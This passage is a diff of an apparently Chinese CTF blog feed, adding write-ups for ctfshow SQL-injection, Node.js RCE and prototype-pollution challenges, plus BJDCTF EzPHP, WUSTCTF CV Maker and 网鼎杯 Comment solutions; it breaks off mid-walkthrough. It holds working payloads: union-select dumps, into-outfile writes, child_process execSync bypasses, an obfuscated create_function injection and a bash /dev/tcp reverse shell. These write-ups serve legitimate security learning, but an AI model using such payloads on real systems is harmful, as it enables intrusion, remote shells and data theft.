@@ -2366,7 +2366,16 @@
 <h3 id="web-173"><a href="#web-173" class="headerlink" title="web 173"></a>web 173</h3><p>对username进一步过滤，flag不能出现，那么我们直接爆出password所有内容就行</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-1&#x27;union select 1,2,(select group_concat(&#x27;~&#x27;,password) from ctfshow_user3);--+</span><br></pre></td></tr></table></figure>
 
-<h3 id="web-174"><a href="#web-174" class="headerlink" title="web 174"></a>web 174</h3><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="web-361"><a href="#web-361" class="headerlink" title="web 361"></a>web 361</h3><p>这里跳了一下，看一下模板，ssti</p>
+<h3 id="web-174"><a href="#web-174" class="headerlink" title="web 174"></a>web 174</h3><p>这里不仅过滤了flag还跟着过滤掉了数字，可以再查询出结果之前对他进行替换</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1&#x27; union select REPLACE(username,&#x27;g&#x27;,&#x27;j&#x27;),REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(password,&#x27;0&#x27;,&#x27;numa&#x27;),&#x27;1&#x27;,&#x27;numb&#x27;),&#x27;2&#x27;,&#x27;numc&#x27;),&#x27;3&#x27;,&#x27;numd&#x27;),&#x27;4&#x27;,&#x27;nume&#x27;),&#x27;5&#x27;,&#x27;numf&#x27;),&#x27;6&#x27;,&#x27;numg&#x27;),&#x27;7&#x27;,&#x27;numh&#x27;),&#x27;8&#x27;,&#x27;numi&#x27;),&#x27;9&#x27;,&#x27;numj&#x27;),&#x27;g&#x27;,&#x27;xiaolong&#x27;) from ctfshow_user4;--+</span><br></pre></td></tr></table></figure>
+
+<p>拿到flag之后对他进行还原即可</p>
+<h3 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h3><p>应该是要用到时间盲注,但是有点费时间还可以直接写入文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(password) from ctfshow_user5 into outfile &#x27;/var/www/html/1.txt&#x27;%23</span><br></pre></td></tr></table></figure>
+
+<p>然后访问网址即可</p>
+<h3 id="web-176（过滤注入）"><a href="#web-176（过滤注入）" class="headerlink" title="web 176（过滤注入）"></a>web 176（过滤注入）</h3><p>emmmm似乎是没有什么过滤<code>1&#39;or&#39;1&#39;=&#39;1</code></p>
+<h3 id="web-177"><a href="#web-177" class="headerlink" title="web 177"></a>web 177</h3><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="web-361"><a href="#web-361" class="headerlink" title="web 361"></a>web 361</h3><p>这里跳了一下，看一下模板，ssti</p>
 <p>题目的提示：名字就是提示，我们只需要在网页的后面以get方式传入一个值就行了</p>
 <p>既然是ssti那么我们直接测试一下49看一下</p>
 <p>如果返回的是7777777那么就是jinjia2</p>
@@ -2394,7 +2403,29 @@
 <h3 id="web-256"><a href="#web-256" class="headerlink" title="web 256"></a>web 256</h3><p>跟上面的不同，需要账号密码不同才能够登录，我们直接在cookie里面构造的序列化中构造不一样的账号密码登录即可</p>
 <h3 id="web-257"><a href="#web-257" class="headerlink" title="web 257"></a>web 257</h3><p>因为在ctfshowuser类中的构造方法指定了新构造的链子，我们需要改另一个链子作为下一个目标，所以可以直接修改构造函数里面的值来更改他的链子拿到flag</p>
 <h3 id="web-258"><a href="#web-258" class="headerlink" title="web 258"></a>web 258</h3><p>对cookie多了一层过滤，<code>O:</code>还有<code>C:</code>后面不能有数字，我们可以在编码之前加上一个加号，这样编码回去的时候加号会被解析回来</p>
-<h3 id="web-259"><a href="#web-259" class="headerlink" title="web 259"></a>web 259</h3>]]></content>
+<h3 id="web-259"><a href="#web-259" class="headerlink" title="web 259"></a>web 259</h3><h2 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h2><h3 id="web-334"><a href="#web-334" class="headerlink" title="web 334"></a>web 334</h3><p>直接下载源码，判断条件是账号密码正确</p>
+<p>给出了账号密码：CTFSHOW  123456</p>
+<p>账号会经过一层过滤，将小写转换成大写，直接输入ctfshow  123456登录即可</p>
+<h3 id="web-335"><a href="#web-335" class="headerlink" title="web 335"></a>web 335</h3><p>查看源码发现<code>/?eval=</code></p>
+<p>猜测是一条nodejs RCE</p>
+<p>直接注入：<code>require(&quot;child_process&quot;).execSync(&#39;ls /&#39;);</code></p>
+<h3 id="web-336"><a href="#web-336" class="headerlink" title="web 336"></a>web 336</h3><p>一层小小的过滤，将上面的execSync用拼接的方式拼接即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(&quot;child_process&quot;)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="web-337"><a href="#web-337" class="headerlink" title="web 337"></a>web 337</h3><p>数组绕过</p>
+<p><code>a[x]=1&amp;b[x]=2</code></p>
+<h3 id="web-338"><a href="#web-338" class="headerlink" title="web 338"></a>web 338</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var router = express.Router();</span><br><span class="line">var utils = require(&#x27;../utils/common&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* GET home page.  */</span><br><span class="line">router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123;</span><br><span class="line">  res.type(&#x27;html&#x27;);</span><br><span class="line">  var flag=&#x27;flag_here&#x27;;</span><br><span class="line">  var secert = &#123;&#125;;</span><br><span class="line">  var sess = req.session;</span><br><span class="line">  let user = &#123;&#125;;</span><br><span class="line">  utils.copy(user,req.body);</span><br><span class="line">  if(secert.ctfshow===&#x27;36dboy&#x27;)&#123;</span><br><span class="line">    res.end(flag);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    return res.json(&#123;ret_code: 2, ret_msg: &#x27;登录失败&#x27;+JSON.stringify(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">module.exports = router;</span><br></pre></td></tr></table></figure>
+
+<p>主要的点在这里：</p>
+<p><code>  utils.copy(user,req.body);</code></p>
+<p>他没有限制我们的输入，而secret跟user都是空</p>
+<p>那么我们在输入的时候直接让<code>user.__proto__=&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;</code>即可</p>
+<h3 id="web-339"><a href="#web-339" class="headerlink" title="web 339"></a>web 339</h3><p>他将判断条件改成了<code>secret.ctfshow===flag</code></p>
+<p>但是flag是变量，所以不行</p>
+<p>发现比上一条题目多了一个文件，看了下这个query是没有定义的，我们可以在上面对他的父类属性进行覆盖，然后里面填入我们要执行的语句反弹一个shell就行</p>
+<p>​    ~~~</p>
+<p>{“<strong>proto</strong>“:{“query”:”return global.process.mainModule.constructor._load(‘child_process’).exec(‘bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip地址/端口 0&gt;&amp;1&quot;‘)”}}</p>
+]]></content>
       <tags>
         <tag>ctfshow</tag>
       </tags>
@@ -2627,7 +2658,7 @@
 <p>jwt的构成：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">由两个点分割成三部分，第一步分是经过base64编码之后的JWT头其中含有两个信息一个是type(默认是JWT)声明类型，另一个是声明加密的算法alg(algorithm)</span><br><span class="line">可以将JWT中的alg算法修改为none：</span><br><span class="line">JWT支持将算法设定为“None”。如果“alg”字段设为“ None”，那么JWT的第三部分会被置空，这样任何token都是有效的。这样就可以伪造token进行随意访问。</span><br></pre></td></tr></table></figure>
 
-<p>所以这里我们需要将alg设置为none，还得将secretid改为空数组，因为再js是一个弱类型语言，空数组的比较永远为真，然后我们将第二个点后面的东西直接删除然后就可以登录上去</p>
+<p>所以这里我们需要将alg设置为none，还得将secretid改为空数组（js是一个弱类型语言，空数组的比较永远为真），然后我们将第二个点后面的东西直接删除然后就可以登录上去</p>
 <p>登录上去之后点击getflag就可以拿到flag</p>
 ]]></content>
       <tags>
@@ -2965,6 +2996,425 @@ payload:
 ]]></content>
       <tags>
         <tag>WUSTCTF2020</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CV-Maker</title>
+    <url>/2022/04/09/CV-Maker/</url>
+    <content><![CDATA[<h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>题目不是很难，一个简单的文件上传，文件上传点也非常好找</p>
+<p>先注册登录进去</p>
+<p>然后页面就是一个设置上传头像的地方了</p>
+<p>只有一个小小的图片头伪造</p>
+<p>GIF89a就可以绕过</p>
+<p>直接写入一句话</p>
+<p>需要找到的就是上传的目录了</p>
+<p>查看了一下源码发现</p>
+<p><img src="/2022/04/09/CV-Maker/1.png" alt="1"></p>
+<p>上传目录也给出来了</p>
+<p>直接进入然后RCE就行没有任何问题</p>
+]]></content>
+      <tags>
+        <tag>WUSTCTF2020</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BJDCTF2020_EzPHP</title>
+    <url>/2022/04/12/BJDCTF2020-EzPHP/</url>
+    <content><![CDATA[<h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p>在页面源码发现提示</p>
+<p>base32解密：<code>1nD3x.php</code></p>
+<p>访问页面拿到源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;1nD3x.php&quot;</span>;</span><br><span class="line"><span class="variable">$shana</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shana&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="variable">$arg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])<span class="comment">#查询字符串</span></span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;<span class="comment">#如果不是http协议</span></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; <span class="comment">#需要匹配debu但是$符号匹配的是句尾的换行符debu=aqua_is_cute%0a</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123; <span class="comment">#遍历传入参数，不能有英文字母</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_get_contents(<span class="variable">$file</span>) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)<span class="comment">#如果拿到的文件的内容不是debu_debu_aqua输出下列语句退出</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( sha1(<span class="variable">$shana</span>) === sha1(<span class="variable">$passwd</span>) &amp;&amp; <span class="variable">$shana</span> != <span class="variable">$passwd</span> )&#123;<span class="comment">#数组对比变量覆盖</span></span><br><span class="line">    extract(<span class="variable">$_GET</span>[<span class="string">&quot;flag&quot;</span>]);<span class="comment">#对arg以及code进行变量覆盖？</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable">$code</span>) || </span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="variable">$arg</span>) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$code</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>一步步分析</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])<span class="comment">#查询字符串</span></span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>判断查询字符串不能有以上字符否则直接退出</p>
+<p>这里是直接拿到我们的输入内容，可以直接用urlencode编码一下直接绕过</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;<span class="comment">#如果不是http协议</span></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; <span class="comment">#需要匹配debu但是$符号匹配的是句尾的换行符debu=aqua_is_cute%0a</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>传入的file不能是http/s协议，然后会对debu进行一次正则匹配需要满足正则而又不能全等与<code>aqua_is_cute</code>：$判尾的判定：判定的是结束的换行符</p>
+<p>这里的debu可以通过<code>aqua_is_cute%0a</code>的形式绕过，将这里的file覆盖，至于file是什么这里还没有提到，接着往下看</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123; <span class="comment">#遍历传入参数，不能有英文字母</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>他判定我们输入的参数不能有英文字母，但是根据他的特性我们知道，$_REQUEST如果同时传入GET、POST的话，POST的优先级是大于GET传入的参数的，所以我们只需要将不是数组的参数用post同时传入一个数字就行了</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_get_contents(<span class="variable">$file</span>) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)<span class="comment">#如果拿到的文件的内容不是debu_debu_aqua输出下列语句退出</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>用到了file，可以用data伪协议来传入我们想要的数据<code>data://text/plain,debu_debu_aqua</code></p>
+<p>进入到下面</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( sha1(<span class="variable">$shana</span>) === sha1(<span class="variable">$passwd</span>) &amp;&amp; <span class="variable">$shana</span> != <span class="variable">$passwd</span> )&#123;<span class="comment">#数组对比变量覆盖</span></span><br><span class="line">    extract(<span class="variable">$_GET</span>[<span class="string">&quot;flag&quot;</span>]);<span class="comment">#对arg以及code进行变量覆盖？</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>sha1绕过很简单，他无法处理数组，所以直接构造数组变量就行</p>
+<p>下面提供了变量覆盖，接着往下看</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable">$code</span>) || </span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="variable">$arg</span>) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$code</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>因为code刚开始给的是空字符串，那么上面的变量覆盖就是覆盖这两个变量了</p>
+<p>结合下面可以利用的<code>$code(&#39;&#39;, $arg); </code></p>
+<p>想到可以利用<code>create_function</code></p>
+<p>然后构造闭合就可以在外边执行我们的语句</p>
+<p>所以需要构造<code>flag[code]=create_function&amp;flag[arg]=&#125;构造语句//</code></p>
+<p>我们可以先看一下<code>get_defined_vars — 返回由所有已定义变量所组成的数组 </code></p>
+<p>先读一下里面的内容</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file=%<span class="number">64</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">61</span>%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F%<span class="number">74</span>%<span class="number">65</span>%<span class="number">78</span>%<span class="number">74</span>%<span class="number">2</span>F%<span class="number">70</span>%<span class="number">6</span>C%<span class="number">61</span>%<span class="number">69</span>%<span class="number">6</span>E%<span class="number">2</span>C%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>%<span class="number">5</span>F%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>%<span class="number">5</span>F%<span class="number">61</span>%<span class="number">71</span>%<span class="number">75</span>%<span class="number">61</span>&amp;%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>=%<span class="number">61</span>%<span class="number">71</span>%<span class="number">75</span>%<span class="number">61</span>%<span class="number">5</span>F%<span class="number">69</span>%<span class="number">73</span>%<span class="number">5</span>F%<span class="number">63</span>%<span class="number">75</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">0</span>a&amp;%<span class="number">73</span>%<span class="number">68</span>%<span class="number">61</span>%<span class="number">6</span>E%<span class="number">61</span>[]=<span class="number">1</span>&amp;%<span class="number">70</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">73</span>%<span class="number">77</span>%<span class="number">64</span>[]=<span class="number">2</span>&amp;%<span class="number">66</span>%<span class="number">6</span>C%<span class="number">61</span>%<span class="number">67</span>[%<span class="number">63</span>%<span class="number">6</span>F%<span class="number">64</span>%<span class="number">65</span>]=%<span class="number">63</span>%<span class="number">72</span>%<span class="number">65</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">65</span>_%<span class="number">66</span>%<span class="number">75</span>%<span class="number">6</span>E%<span class="number">63</span>%<span class="number">74</span>%<span class="number">69</span>%<span class="number">6</span>F%<span class="number">6</span>E&amp;%<span class="number">66</span>%<span class="number">6</span>C%<span class="number">61</span>%<span class="number">67</span>[%<span class="number">61</span>%<span class="number">72</span>%<span class="number">67</span>]=&#125;var_dump(get_defined_vars());<span class="comment">//</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/12/BJDCTF2020-EzPHP/1.png" alt="1"></p>
+<p>发现flag页面<code>rea1fl4g.php</code></p>
+<p>直接访问看看</p>
+<p><code>咦，你居然找到我了？！不过看到这句话也不代表你就能拿到flag哦！</code>垃圾信息，那么我们可以构造伪协议直接读取他的页面源码</p>
+<p>还是在arg位置，因为inc被ban了所以include不能用可以用require</p>
+<p>因为需要用到伪协议，而arg有很多过滤，所以我们用取反绕过一下</p>
+<p>最终payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=%64%61%74%61%3A%2F%2F%74%65%78%74%2F%70%6C%61%69%6E%2C%64%65%62%75%5F%64%65%62%75%5F%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5F%69%73%5F%63%75%74%65%0a&amp;%73%68%61%6E%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6C%61%67[%63%6F%64%65]=%63%72%65%61%74%65_%66%75%6E%63%74%69%6F%6E&amp;%66%6C%61%67[%61%72%67]=&#125;require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//</span><br><span class="line"></span><br><span class="line">post:file=1&amp;debu=1</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <tags>
+        <tag>BJDCTF2020</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Comment</title>
+    <url>/2022/04/09/Comment/</url>
+    <content><![CDATA[<h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p>进入是像是一个留言板</p>
+<p>需要登录</p>
+<p><img src="/2022/04/09/Comment/1.png" alt="1"></p>
+<p>直接爆破后三位就行，爆出密码666</p>
+<p>登录进去</p>
+<p>扫描的时候发现git文件泄露</p>
+<p>直接用GitHack下载源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现好像没有什么用啊</p>
+<p>也没什么有价值的信息</p>
+<p>在查看页面的时候发现在控制台处有个提示：</p>
+<p><img src="/2022/04/09/Comment/2.png" alt="1"></p>
+<p>意识到git可能不全，需要恢复</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg log --relog</span><br><span class="line"></span><br><span class="line">commit e5b2a2443c2b6d395d06960123142bc91123148c (refs/stash)</span><br><span class="line">Merge: bfbdf21 5556e3a</span><br><span class="line">Author: root &lt;root@localhost.localdomain&gt;</span><br><span class="line">Date:   Sat Aug 11 22:51:17 2018 +0800</span><br><span class="line"></span><br><span class="line">    WIP on master: bfbdf21 add write_do.php</span><br><span class="line"></span><br><span class="line">commit 5556e3ad3f21a0cf5938e26985a04ce3aa73faaf</span><br><span class="line">Author: root &lt;root@localhost.localdomain&gt;</span><br><span class="line">Date:   Sat Aug 11 22:51:17 2018 +0800</span><br><span class="line"></span><br><span class="line">    index on master: bfbdf21 add write_do.php</span><br><span class="line"></span><br><span class="line">commit bfbdf218902476c5c6164beedd8d2fcf593ea23b (HEAD -&gt; master)</span><br><span class="line">Author: root &lt;root@localhost.localdomain&gt;</span><br><span class="line">Date:   Sat Aug 11 22:47:29 2018 +0800</span><br><span class="line"></span><br><span class="line">    add write_do.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>发现我们现在是修改过的，需要恢复到未修改的状态<code>e5b2a2443c2b6d395d06960123142bc91123148c</code></p>
+<p><code>git reset --harf e5b2a2443c2b6d395d06960123142bc91123148c</code></p>
+<p>然后再打开文件：</p>
